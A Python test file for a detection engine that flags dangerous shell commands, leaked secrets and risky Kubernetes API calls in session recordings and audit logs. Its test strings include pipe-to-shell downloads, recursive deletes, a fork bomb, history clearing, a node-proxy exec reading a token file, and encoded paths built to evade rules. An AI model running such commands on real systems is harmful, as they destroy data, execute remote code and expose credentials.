"""Tests for the built-in detection rule engine."""

import json
import re
from dataclasses import FrozenInstanceError

import pytest

from gatorcast.models import ApiRequest
from gatorcast.pipeline.classify import classify
from gatorcast.pipeline.extract import ExtractResult
from gatorcast.pipeline.detect import (
    BUILTIN_API_RULES,
    BUILTIN_RULES,
    SEVERITY_RANK,
    ApiRule,
    Finding,
    detect,
    detect_api,
    load_api_rules,
    load_rules,
    max_severity,
)
from tests.samples import FIXTURES


def _ex(text: str) -> ExtractResult:
    return ExtractResult(text=text, offsets=[(0, 0.0)])


def test_flags_recursive_delete():
    f = detect(_ex("user@h:~$ rm -rf /var/data\n"))
    ids = {x.rule_id for x in f}
    assert "recursive-delete" in ids
    # rule 6: label must never contain the recorded target text
    assert all(x.label and "/var/data" not in x.label for x in f)


def test_flags_pipe_to_shell_and_secret():
    f = detect(_ex("curl http://x/i.sh | sh\nexport AWS=AKIAIOSFODNN7EXAMPLE\n"))
    cats = {x.category for x in f}
    assert "dangerous-command" in cats and "secret-exposure" in cats


def test_benign_text_no_findings():
    assert detect(_ex("ls -la\ncat README.md\necho hello world\n")) == []


def test_one_finding_per_rule_with_earliest_offset():
    ex = ExtractResult(text="rm -rf a\nrm -rf b\n", offsets=[(0, 1.0), (9, 5.0)])
    f = [x for x in detect(ex) if x.rule_id == "recursive-delete"]
    assert len(f) == 1 and f[0].offset_seconds == 1.0  # earliest match


def test_load_rules_returns_builtins():
    assert load_rules() is BUILTIN_RULES
    assert len(load_rules()) >= 16


def test_max_severity():
    f = detect(_ex("rm -rf /\n"))
    assert max_severity(f) in {"critical", "high"}
    assert max_severity([]) is None


def test_finding_never_carries_recorded_text():
    # A secret value must never appear in any Finding field.
    secret = "AKIAIOSFODNN7EXAMPLE"
    f = detect(_ex(f"export KEY={secret}\n"))
    for finding in f:
        for value in (finding.rule_id, finding.category, finding.severity, finding.label):
            assert secret not in value


# --- Per-rule positive + negative pins ---


def _ids(text: str) -> set[str]:
    return {x.rule_id for x in detect(_ex(text))}


def test_recursive_delete_pos_neg():
    assert "recursive-delete" in _ids("rm -rf /tmp/x\n")
    assert "recursive-delete" not in _ids("rm file.txt\n")


def test_pipe_to_shell_pos_neg():
    assert "pipe-to-shell" in _ids("wget -qO- http://x/s | sudo bash\n")
    assert "pipe-to-shell" not in _ids("curl http://x/s -o file.sh\n")


def test_aws_key_pos_neg():
    assert "aws-key" in _ids("AKIAIOSFODNN7EXAMPLE\n")
    assert "aws-key" not in _ids("AKIA is a prefix but not a key\n")


def test_private_key_pos_neg():
    assert "private-key" in _ids("-----BEGIN OPENSSH PRIVATE KEY-----\n")
    assert "private-key" in _ids("-----BEGIN PRIVATE KEY-----\n")
    assert "private-key" not in _ids("-----BEGIN CERTIFICATE-----\n")


def test_generic_secret_assign_pos_neg():
    assert "generic-secret-assign" in _ids('password="hunter2xyz"\n')
    assert "generic-secret-assign" in _ids("api_key=abcdef123\n")
    assert "generic-secret-assign" not in _ids("username=bob\n")


def test_kubectl_delete_pos_neg():
    assert "kubectl-delete" in _ids("kubectl delete pod foo\n")
    assert "kubectl-delete" not in _ids("kubectl get pods\n")


def test_fork_bomb_pos_neg():
    assert "fork-bomb" in _ids(":(){ :|:& };:\n")
    assert "fork-bomb" not in _ids("echo hello\n")


def test_chmod_777_pos_neg():
    assert "chmod-777" in _ids("chmod 777 /srv\n")
    assert "chmod-777" not in _ids("chmod 644 /srv\n")


def test_history_clear_pos_neg():
    assert "history-clear" in _ids("history -c\n")
    assert "history-clear" not in _ids("git log\n")


def test_vault_token_case_sensitive():
    assert "vault-token" in _ids("hvs.CAESIJabcdef0123456789ABCDEFGHIJ\n")
    assert "vault-token" in _ids("VAULT_TOKEN=s.xxxxxxxx\n")


def test_github_token_case_sensitive():
    good = "ghp_" + "a" * 36
    assert "github-token" in _ids(good + "\n")
    # uppercase prefix must NOT match (case fidelity preserved)
    assert "github-token" not in _ids("GHP_" + "a" * 36 + "\n")


# --- Kubernetes API request rules (Session 9, spec §10) ---


def _api_ids(method: str, url: str) -> list[str]:
    """Rule ids fired by ``detect_api`` for one request, in declaration order."""
    return [f.rule_id for f in detect_api(method, url)]


def test_load_api_rules_returns_builtins() -> None:
    assert load_api_rules() is BUILTIN_API_RULES
    assert [r.id for r in load_api_rules()] == [
        "kube-delete",
        "kube-secrets",
        "kube-evict",
        "kube-cordon",
        "kube-exec",
        "kube-node-proxy-exec",
    ]
    assert all(r.category == "kube-api" for r in load_api_rules())


def test_api_rule_is_frozen() -> None:
    with pytest.raises(FrozenInstanceError):
        BUILTIN_API_RULES[0].id = "changed"  # type: ignore[misc]


def test_api_rule_severities() -> None:
    sev = {r.id: r.severity for r in BUILTIN_API_RULES}
    assert sev == {
        "kube-delete": "high",
        "kube-secrets": "high",
        "kube-evict": "high",
        "kube-cordon": "medium",
        "kube-exec": "medium",
        "kube-node-proxy-exec": "high",
    }


def test_kube_delete_pos_neg() -> None:
    assert _api_ids("DELETE", "/api/v1/namespaces/default/pods/web-1") == ["kube-delete"]
    assert _api_ids("DELETE", "/apis/apps/v1/namespaces/default/deployments/web") == ["kube-delete"]
    # any resource, collection deletes included
    assert "kube-delete" in _api_ids("DELETE", "/api/v1/namespaces/default/pods")
    # other methods on the same path do not fire it
    for method in ("GET", "POST", "PUT", "PATCH"):
        assert "kube-delete" not in _api_ids(method, "/api/v1/namespaces/default/pods/web-1")


def test_kube_delete_fires_with_query_string() -> None:
    assert _api_ids("DELETE", "/api/v1/namespaces/default/pods/web-1?gracePeriodSeconds=0") == [
        "kube-delete"
    ]


def test_kube_secrets_pos_neg() -> None:
    assert _api_ids("GET", "/api/v1/namespaces/default/secrets") == ["kube-secrets"]
    assert _api_ids("GET", "/api/v1/namespaces/default/secrets/db-password") == ["kube-secrets"]
    # any method
    for method in ("GET", "POST", "PUT", "PATCH"):
        assert "kube-secrets" in _api_ids(method, "/api/v1/namespaces/default/secrets/x")
    # cluster-wide listing
    assert _api_ids("GET", "/api/v1/secrets") == ["kube-secrets"]
    # near misses
    assert "kube-secrets" not in _api_ids("GET", "/api/v1/namespaces/default/configmaps")
    assert "kube-secrets" not in _api_ids("GET", "/api/v1/namespaces/default/secretsfoo")
    assert "kube-secrets" not in _api_ids("GET", "/api/v1/namespaces/default/my-secrets")
    assert "kube-secrets" not in _api_ids("GET", "/api/v1/namespaces/default/pods")


@pytest.mark.parametrize(
    "url",
    [
        "/api/v1/namespaces/default/pods?labelSelector=/secrets",
        "/api/v1/namespaces/default/pods?fieldSelector=metadata.name%3D/secrets/x",
        "/api/v1/namespaces/default/pods?x=/secrets/",
        "/api/v1/namespaces/default/pods?next=%2Fsecrets",
        "/api?timeout=32s&path=/secrets",
    ],
)
def test_query_string_containing_secrets_does_not_fire(url: str) -> None:
    """Only the URL path is matched; /secrets inside the query must not fire kube-secrets."""
    assert "kube-secrets" not in _api_ids("GET", url)
    assert detect_api("GET", url) == []


def test_kube_evict_pos_neg() -> None:
    assert _api_ids("POST", "/api/v1/namespaces/default/pods/web-1/eviction") == ["kube-evict"]
    assert "kube-evict" not in _api_ids("GET", "/api/v1/namespaces/default/pods/web-1/eviction")
    assert "kube-evict" not in _api_ids("PUT", "/api/v1/namespaces/default/pods/web-1/eviction")
    assert "kube-evict" not in _api_ids("POST", "/api/v1/namespaces/default/pods/web-1/binding")
    assert "kube-evict" not in _api_ids("POST", "/api/v1/namespaces/default/pods/web-1/eviction/x")
    assert "kube-evict" not in _api_ids("POST", "/api/v1/namespaces/default/pods")


def test_kube_cordon_pos_neg() -> None:
    assert _api_ids("PATCH", "/api/v1/nodes/node-1") == ["kube-cordon"]
    assert "kube-cordon" not in _api_ids("GET", "/api/v1/nodes/node-1")
    assert "kube-cordon" not in _api_ids("PUT", "/api/v1/nodes/node-1")
    assert "kube-cordon" not in _api_ids("PATCH", "/api/v1/nodes")  # collection
    assert "kube-cordon" not in _api_ids("PATCH", "/api/v1/nodes/node-1/status")
    assert "kube-cordon" not in _api_ids("PATCH", "/api/v1/namespaces/default/pods/web-1")
    # anchored: a nodes path nested elsewhere is not the core Node object
    assert "kube-cordon" not in _api_ids("PATCH", "/apis/example.io/v1/api/v1/nodes/node-1")


def test_kube_exec_pos_neg() -> None:
    assert _api_ids("POST", "/api/v1/namespaces/default/pods/web-1/exec") == ["kube-exec"]
    assert _api_ids("POST", "/api/v1/namespaces/default/pods/web-1/attach") == ["kube-exec"]
    # any method (WebSocket upgrades arrive as GET)
    assert _api_ids("GET", "/api/v1/namespaces/default/pods/web-1/exec") == ["kube-exec"]
    # near misses
    assert "kube-exec" not in _api_ids("GET", "/api/v1/namespaces/default/pods/web-1/log")
    assert "kube-exec" not in _api_ids("GET", "/api/v1/namespaces/default/pods/web-1")
    assert "kube-exec" not in _api_ids("POST", "/api/v1/namespaces/default/pods/web-1/exec/x")
    assert "kube-exec" not in _api_ids("POST", "/api/v1/namespaces/default/pods/web-1/execute")
    assert "kube-exec" not in _api_ids("POST", "/api/v1/namespaces/default/pods//exec")


def test_kube_exec_fires_on_sanitized_exec_url() -> None:
    """The URL as stored (command stripped, flags kept) still fires kube-exec."""
    url = "/api/v1/namespaces/default/pods/web-1/exec?container=nginx&stdin=true&stdout=true&tty=true"
    assert _api_ids("POST", url) == ["kube-exec"]


def test_exec_in_query_only_does_not_fire() -> None:
    assert "kube-exec" not in _api_ids("GET", "/api/v1/pods?x=/pods/p/exec")


# --- F1: node-proxy exec/run/attach ---


@pytest.mark.parametrize(
    "url",
    [
        # raw URL as the Gateway logs it (F1 probe)
        "/api/v1/nodes/n1/proxy/exec/ns/p/c?command=cat&command=/etc/token",
        "/api/v1/nodes/n1/proxy/run/ns/p/c?cmd=id",
        "/api/v1/nodes/n1/proxy/attach/ns/p/c",
        # the prefix classify keeps in storage
        "/api/v1/nodes/n1/proxy/exec",
        "/api/v1/nodes/n1/proxy/run",
        "/api/v1/nodes/n1/proxy/attach",
        # normalization variants
        "/api/v1/nodes/n1/proxy/exec/",
        "/api/v1/nodes/n1/proxy//exec/ns/p/c",
        "/api/v1/nodes/n1/proxy/%65xec/ns/p/c",
        "/api/v1/nodes/n1/PROXY/Exec",
        "/api/v1/nodes/n1%2Fproxy/exec",
    ],
)
def test_kube_node_proxy_exec_fires(url: str) -> None:
    """The rule fires on raw node-proxy URLs and on the prefix classify stores."""
    for method in ("GET", "POST"):
        assert "kube-node-proxy-exec" in _api_ids(method, url)
    finding = next(f for f in detect_api("GET", url) if f.rule_id == "kube-node-proxy-exec")
    assert finding.severity == "high"
    assert finding.category == "kube-api"
    assert finding.offset_seconds is None


@pytest.mark.parametrize(
    "url",
    [
        "/api/v1/nodes/n1/proxy",
        "/api/v1/nodes/n1/proxy/metrics",
        "/api/v1/nodes/n1/proxy/logs/syslog",
        "/api/v1/nodes/n1/proxy/execute",
        "/api/v1/nodes/n1/proxy/runner",
        "/api/v1/nodes/n1/proxy/stats/exec",
        "/api/v1/nodes/n1/exec",
        "/api/v1/nodes/proxy/exec",
        "/api/v1/namespaces/d/pods/p/proxy/exec",
        "/api/v1/namespaces/d/services/s/proxy/exec",
        "/api/v1/nodes/n1/status?x=/nodes/n1/proxy/exec",
    ],
)
def test_kube_node_proxy_exec_near_misses_do_not_fire(url: str) -> None:
    """Only ``/nodes/<n>/proxy/(exec|run|attach)`` fires; query text and look-alikes do not."""
    assert "kube-node-proxy-exec" not in _api_ids("GET", url)


def test_node_proxy_exec_survives_classify_storage() -> None:
    """End to end: classify keeps the exec prefix, detect_api flags the stored URL."""
    event = classify(
        {
            "logger": "gateway.audit",
            "message": "API request completed",
            "ts": "2026-10-01T10:00:00.500Z",
            "request_id": "req-1",
            "conn_id": "conn-1",
            "method": "GET",
            "url": "/api/v1/nodes/n1/proxy/exec/ns/p/c?command=cat&command=/etc/token",
        }
    )
    assert isinstance(event, ApiRequest)
    assert event.url == "/api/v1/nodes/n1/proxy/exec"
    assert "kube-node-proxy-exec" in _api_ids(event.method, event.url)
    assert "token" not in event.url


# --- F2: path variants cannot evade the rules ---


def test_encoded_and_variant_paths_still_fire() -> None:
    """F2: percent-encoding, trailing/repeated slashes, case and fragments do not evade."""
    assert "kube-secrets" in _api_ids("GET", "/namespaces/ns/%73ecrets/x")
    assert "kube-secrets" in _api_ids("GET", "/api/v1/namespaces/ns/%73ecrets/x")
    assert "kube-secrets" in _api_ids("GET", "/api/v1/namespaces/ns/SECRETS/x")
    assert "kube-secrets" in _api_ids("GET", "/api/v1/namespaces/ns//secrets/x")
    assert "kube-secrets" in _api_ids("GET", "/api/v1/namespaces/ns/secrets/")
    assert "kube-exec" in _api_ids("POST", "/pods/p/%65xec")
    assert "kube-exec" in _api_ids("POST", "/api/v1/namespaces/d/pods/p/%65xec")
    assert "kube-exec" in _api_ids("POST", "/api/v1/namespaces/d/pods/p/exec/")
    assert "kube-exec" in _api_ids("POST", "/api/v1/namespaces/d/pods/p//exec")
    assert "kube-exec" in _api_ids("POST", "/api/v1/namespaces/d/pods/p/EXEC")
    assert "kube-exec" in _api_ids("POST", "/api/v1/namespaces/d/pods/p/exec%3Fcommand=x")
    assert "kube-exec" in _api_ids("POST", "/api/v1/namespaces/d/pods/p/exec#x?command=x")
    assert "kube-exec" in _api_ids("POST", "/api/v1/namespaces/d/pods%2Fp/exec")
    assert "kube-evict" in _api_ids("POST", "/api/v1/namespaces/d/pods/p/%45viction/")
    assert "kube-cordon" in _api_ids("PATCH", "/api/v1/nodes/n1/")


def test_fragment_and_encoded_query_text_do_not_fire() -> None:
    """F2: text after a fragment or an encoded ``?`` is not path material for other rules."""
    assert "kube-secrets" not in _api_ids("GET", "/api/v1/pods#/secrets")
    assert "kube-secrets" not in _api_ids("GET", "/api/v1/pods%3F/secrets/x")
    assert "kube-exec" not in _api_ids("GET", "/api/v1/pods%23/pods/p/exec")


def test_variant_near_misses_still_do_not_fire() -> None:
    """F2: normalization does not widen the rules to look-alike resources."""
    assert "kube-secrets" not in _api_ids("GET", "/api/v1/namespaces/d/%73ecretsfoo")
    assert "kube-exec" not in _api_ids("POST", "/api/v1/namespaces/d/pods/p/%65xecute")
    assert "kube-exec" not in _api_ids("POST", "/api/v1/namespaces/d/pods/p/exec/x")
    assert _api_ids("GET", "/") == []


def test_detect_api_matches_lowercased_path() -> None:
    """F2: rules see the lower-cased normalized path, so a lower-case pattern matches any case."""
    rules = [ApiRule("lc", "kube-api", "low", "Lc", None, re.compile(r"^/api/v1/foo$"))]
    assert [f.rule_id for f in detect_api("GET", "/API/V1/Foo/", rules)] == ["lc"]


def test_benign_requests_yield_no_findings() -> None:
    assert detect_api("GET", "/api") == []
    assert detect_api("GET", "/api/v1/namespaces/default/pods?labelSelector=app%3Dweb&limit=500") == []
    assert detect_api("GET", "/apis/apps/v1/namespaces/default/deployments/web") == []
    assert detect_api("POST", "/api/v1/namespaces/default/configmaps") == []
    assert detect_api("PATCH", "/apis/apps/v1/namespaces/default/deployments/web") == []


def test_method_is_case_insensitive() -> None:
    assert _api_ids("delete", "/api/v1/namespaces/default/pods/p") == ["kube-delete"]
    assert _api_ids("patch", "/api/v1/nodes/n1") == ["kube-cordon"]
    assert _api_ids("Post", "/api/v1/namespaces/d/pods/p/eviction") == ["kube-evict"]


def test_multiple_rules_fire_in_declaration_order() -> None:
    assert _api_ids("DELETE", "/api/v1/namespaces/default/secrets/db") == [
        "kube-delete",
        "kube-secrets",
    ]


def test_api_findings_have_no_offset_and_full_metadata() -> None:
    findings = detect_api("DELETE", "/api/v1/namespaces/default/secrets/db")
    assert len(findings) == 2
    for finding in findings:
        assert isinstance(finding, Finding)
        assert finding.offset_seconds is None
        assert finding.category == "kube-api"
        assert finding.severity in SEVERITY_RANK
        assert finding.label
    by_id = {f.rule_id: f for f in findings}
    assert by_id["kube-delete"].label == "Kubernetes resource delete"
    assert by_id["kube-secrets"].severity == "high"


def test_api_finding_never_carries_url() -> None:
    """The request URL / resource names never leak into a Finding (rule 6 analogue)."""
    url = "/api/v1/namespaces/very-private-ns/secrets/very-private-name"
    for finding in detect_api("DELETE", url):
        for value in (finding.rule_id, finding.category, finding.severity, finding.label):
            assert "very-private" not in value
            assert "/api/" not in value


def test_detect_api_with_explicit_rules() -> None:
    custom = [
        ApiRule(
            "custom-configmap",
            "kube-api",
            "low",
            "ConfigMap write",
            frozenset({"PUT", "POST"}),
            re.compile(r"/configmaps"),
        )
    ]
    assert [f.rule_id for f in detect_api("PUT", "/api/v1/namespaces/d/configmaps/c", custom)] == [
        "custom-configmap"
    ]
    assert detect_api("GET", "/api/v1/namespaces/d/configmaps/c", custom) == []
    # built-ins are not consulted when an explicit set is given
    assert detect_api("DELETE", "/api/v1/namespaces/d/pods/p", custom) == []
    assert detect_api("DELETE", "/api/v1/namespaces/d/pods/p", []) == []


def test_api_rule_with_any_method() -> None:
    any_method = [ApiRule("any", "kube-api", "low", "Any", None, re.compile(r"^/x$"))]
    assert [f.rule_id for f in detect_api("TRACE", "/x", any_method)] == ["any"]


def test_api_rule_path_search_ignores_query_even_for_custom_rules() -> None:
    rules = [ApiRule("q", "kube-api", "low", "Q", None, re.compile(r"needle"))]
    assert detect_api("GET", "/a?x=needle", rules) == []
    assert len(detect_api("GET", "/needle?x=1", rules)) == 1


def test_max_severity_over_api_findings() -> None:
    assert max_severity(detect_api("PATCH", "/api/v1/nodes/n1")) == "medium"
    assert max_severity(detect_api("DELETE", "/api/v1/namespaces/d/pods/p")) == "high"
    assert max_severity(detect_api("GET", "/api")) is None


def test_fixture_requests_only_exec_fires() -> None:
    """End to end over the synthetic kubectl fixture: classify -> detect_api."""
    text = (FIXTURES / "kubectl_audit_lines.ndjson").read_text(encoding="utf-8")
    fired: dict[str, list[str]] = {}
    for line in text.splitlines():
        if not line.strip():
            continue
        event = classify(json.loads(line))
        if not isinstance(event, ApiRequest):
            continue
        fired[event.request_id] = [f.rule_id for f in detect_api(event.method, event.url)]
    assert fired["22222222-2222-4222-8222-222222222222"] == ["kube-exec"]
    others = {rid: ids for rid, ids in fired.items() if rid != "22222222-2222-4222-8222-222222222222"}
    assert len(others) == 7
    assert all(ids == [] for ids in others.values())
